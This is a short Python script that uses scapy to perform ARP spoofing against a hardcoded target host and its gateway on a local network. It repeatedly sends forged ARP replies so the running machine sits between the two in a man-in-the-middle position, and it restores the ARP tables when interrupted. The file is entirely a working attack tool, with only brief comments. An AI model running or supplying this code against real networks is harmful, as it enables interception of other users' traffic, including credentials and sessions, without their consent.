import scapy.all as scapy 
import time, optparse,sys

# Get the Mac Address of a specific IP.
def get_mac(ip):
    arp_request_broadcast = scapy.Ether(dst=scapy.ETHER_BROADCAST) / scapy.ARP(pdst=ip)
    ans, unans = scapy.srp(arp_request_broadcast, timeout=2, iface="wlan0", inter=0.1, verbose=0)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

# This will send the arp Packets
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    arp_packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(arp_packet,verbose=False)

# This will resote the IP tabels entires. sanding a good request.
def restore(dst_ip,src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    '''' op=2 for responce.       IP destination & Hardware mac address, IP source & hardware mac address  '''''
    restore_packet = scapy.ARP(op=2,pdst=dst_ip,hwdst=dst_mac,psrc=src_ip,hwsrc=src_mac)
    scapy.send(restore_packet, count=4,verbose=False)


target_ip = "192.168.10.12" 
geteway_ip = "192.168.10.1"

mac = get_mac(target_ip)
print(mac)


try:
    count = 0
    while True:
        spoof(target_ip,geteway_ip)
        spoof(geteway_ip, target_ip)
        count += 2
        print(f"\r[+] Packets Send # {count}",end="")
        sys.stdout.flush()
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[+] Detected Clt + C .... Reseting ARP Tables. Please Waite....")
    restore(target_ip, geteway_ip)
    restore(geteway_ip, target_ip)


